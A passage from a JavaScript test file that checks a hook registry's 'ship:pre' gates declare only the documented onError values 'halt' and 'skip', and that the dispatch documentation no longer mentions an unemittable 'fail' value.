    // and all four dispatch sites use skip/halt. "fail" was a value nothing could ever emit,
    // so a consumer implementing the doc literally would mis-route every error case.
    const declared = new Set(
      realRegistry.byLoopPoint['ship:pre'].gates.map(g => g.onError).filter(Boolean));
    assert.ok(declared.size > 0, 'ship:pre gates must declare an onError policy');
    for (const value of declared) {
      assert.ok(
        ['halt', 'skip'].includes(value),
        `registry emits onError "${value}" outside the documented {halt, skip} vocabulary`,
      );
    }
    assert.doesNotMatch(
      ref,
      /`fail` means surface the error and stop/,
      'loop-hook-dispatch.md must not document an onError value no capability can emit',
    );
  });

});
